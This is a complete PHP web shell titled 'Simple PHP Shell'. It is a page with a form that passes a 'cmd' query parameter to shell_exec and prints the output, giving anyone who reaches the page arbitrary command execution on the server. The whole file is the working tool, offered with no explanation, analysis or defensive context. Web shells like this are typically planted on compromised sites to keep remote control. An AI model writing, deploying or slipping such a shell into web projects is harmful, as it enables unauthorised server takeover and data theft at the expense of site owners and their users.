<?php
if (isset($_GET['cmd'])) {
    $cmd = escapeshellcmd($_GET['cmd']);
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Simple PHP Shell</title>
</head>
<body>
    <form method="GET" action="">
        <input type="text" name="cmd" placeholder="Enter command">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
